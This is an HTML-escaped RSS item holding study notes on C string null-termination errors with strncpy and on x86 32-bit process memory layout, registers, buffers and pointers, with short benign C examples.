class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;The program will print out 01234567899876543210&lt;br&gt;
Where the length of source string is the same or greater than the length of target string&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The source string gets truncated&lt;/li&gt;
&lt;li&gt;The target string may not be properly terminated by null!&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;How can we fix it?&lt;br&gt;
Manually add a null character at the end of the target string:&lt;/p&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Null‐termination errors(fixed)&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *argv[])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; arr[&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;strncpy&lt;/span&gt;(arr, &lt;span class=&#34;string&#34;&gt;&amp;quot;0123456789&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(arr)&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	arr[&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(arr)&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;] = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\0&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%s\n&amp;quot;&lt;/span&gt;, arr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;The function char  &lt;code&gt;*fgets(char *str, int n, FILE *stream)&lt;/code&gt;  reads  &lt;code&gt;(n-1)&lt;/code&gt;  characters from the specific stream plus the final null character&lt;/p&gt;
&lt;h1 id=&#34; Computer memory&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;# Computer memory&#34;&gt;#&lt;/a&gt; Computer memory&lt;/h1&gt;
&lt;h2 id=&#34; Intel x86 (32-bit)&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;# Intel x86 (32-bit)&#34;&gt;#&lt;/a&gt; Intel x86 (32-bit)&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;von Neumann architecture&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Central processing unit (CPU) executes code&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Main memory of the system (RAM) stores all data and code&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Input/output system (I/O) interfaces with devices such as hard drives, keyboards, and monitors&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/24/671a56f0c953f.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;CPU&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The &lt;strong&gt;control unit&lt;/strong&gt; gets instructions to execute from RAM using the instruction pointer, which stores the address of the instruction to execute&lt;br&gt;
&lt;strong&gt;Registers&lt;/strong&gt; are the CPU’s basic data storage units and are often used to save time so that the CPU doesn’t need to access RAM.&lt;/p&gt;
&lt;p&gt;在 32 位 x86 架构中，主要的通用寄存器包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;EAX: 累加器寄存器，用于算术运算和返回值。&lt;/li&gt;
&lt;li&gt;EBX: 基址寄存器，常用于基址存取。&lt;/li&gt;
&lt;li&gt;ECX: 计数器寄存器，常用于循环和移位操作。&lt;/li&gt;
&lt;li&gt;EDX: 数据寄存器，用于 I/O 操作和乘除法。&lt;/li&gt;
&lt;li&gt;ESI: 源索引寄存器，常用于指向内存数据源。&lt;/li&gt;
&lt;li&gt;EDI: 目标索引寄存器，常用于指向内存数据目标。&lt;/li&gt;
&lt;li&gt;EBP: 基址指针寄存器，用于栈帧基址指针。&lt;/li&gt;
&lt;li&gt;ESP: 栈指针寄存器，指向当前栈顶&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The &lt;strong&gt;Arithmetic Logic Unit (ALU)&lt;/strong&gt; executes an instruction fetched from RAM and places the results in registers or memory&lt;/p&gt;
&lt;p&gt;CPU runs a program by fetching and executing each instruction&lt;/p&gt;
&lt;h2 id=&#34;Programs in the main memory&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Programs in the main memory&#34;&gt; #&lt;/a&gt;  Programs in the main memory&lt;/h2&gt;
&lt;p&gt;Processes are programs loaded into memory, broken into small sections&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;.text section&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;.data section&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;.bss section&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Heap section&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Stack section&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Environment/Arguments section&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/24/671a56f09cb3d.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;.text section&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Correspond to the .text portion of the binary executable file.&lt;/p&gt;
&lt;p&gt;Contain the machine instructions to get the task done&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;.data section&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Store global initialised variables such as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;int a = 0;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;.bss section&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Store global uninitialised variables such as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;int a;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Heap section&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Store dynamically allocated variables&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Contain the pre-existing value of that memory&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Grows from the lower-addressed memory to the higher-addressed memory&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;int *I = malloc (sizeof (int));&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Stack section&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Keep track of function calls (recursively)&lt;/p&gt;
&lt;p&gt;Grow from the higher-addressed memory to the lower-addressed memory&lt;/p&gt;
&lt;p&gt;Local variables are in the stack section&lt;/p&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;Environment/Arguments section&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Store a copy of system-level variables that may be required by the process&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;For example, path, shell name, hostname, etc.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Command-line arguments are stored in this area.&lt;/p&gt;
&lt;h2 id=&#34; Buffers&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;# Buffers&#34;&gt;#&lt;/a&gt; Buffers&lt;/h2&gt;
&lt;p&gt;A storage place used to receive and hold data until it can be handled by a process&lt;br&gt;
Each process can have its own set of buffers&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;E.g. memory allocated within the .data or .bss section of the process’s memory&lt;br&gt;
Buffer is of &lt;strong&gt;fixed length once allocated&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Hold any predefined type of data&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34; Pointers&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;# Pointers&#34;&gt;#&lt;/a&gt; Pointers&lt;/h2&gt;
&lt;p&gt;Pointers hold the address of other pieces of memory&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Their size is fixed of 4 bytes for 32-bit memory address&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;C string can be written as a pointer to character:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;char * str;&lt;/li&gt;
&lt;li&gt;int * point1;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;C#’s reference types implicitly use pointers&lt;br&gt;
Use dereference to read the value inside the memory address pointed to by the pointer:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;printf(&amp;quot;%d&amp;quot;, *point1);&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The  &lt;code&gt;*&lt;/code&gt;  symbol dereferences the pointer called point1 and displays the value of the integer using the  &lt;code&gt;printf()&lt;/code&gt;  function&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The type of  &lt;code&gt;point1&lt;/code&gt;  is a pointer&lt;/li&gt;
&lt;li&gt;The type of  &lt;code&gt;*point1&lt;/code&gt;  is an integer&lt;/li&gt;
&lt;/ul&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Putting the pieces of memory together&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; ind = &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;;                     &lt;span class=&#34;comment&#34;&gt;// integer stored in .data (initialized)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *str;                       &lt;span class=&#34;comment&#34;&gt;// string pointer stored in .bss (uninitialized)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; nothing;                     &lt;span class=&#34;comment&#34;&gt;// integer stored in .bss (uninitialized)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;fun&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; c)&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;                                              &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = c;                                  &lt;span class=&#34;comment&#34;&gt;// stored in stack section&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 	str = (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; * &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;));    &lt;span class=&#34;comment&#34;&gt;// reserves 10 characters in heap region &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 	&lt;span class=&#34;built_in&#34;&gt;strncpy&lt;/span&gt;(str, &lt;span class=&#34;string&#34;&gt;&amp;quot;abcde&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;);                   &lt;span class=&#34;comment&#34;&gt;// copies &amp;quot;abcde&amp;quot; into str&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	fun(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
    </channel>
</rss>
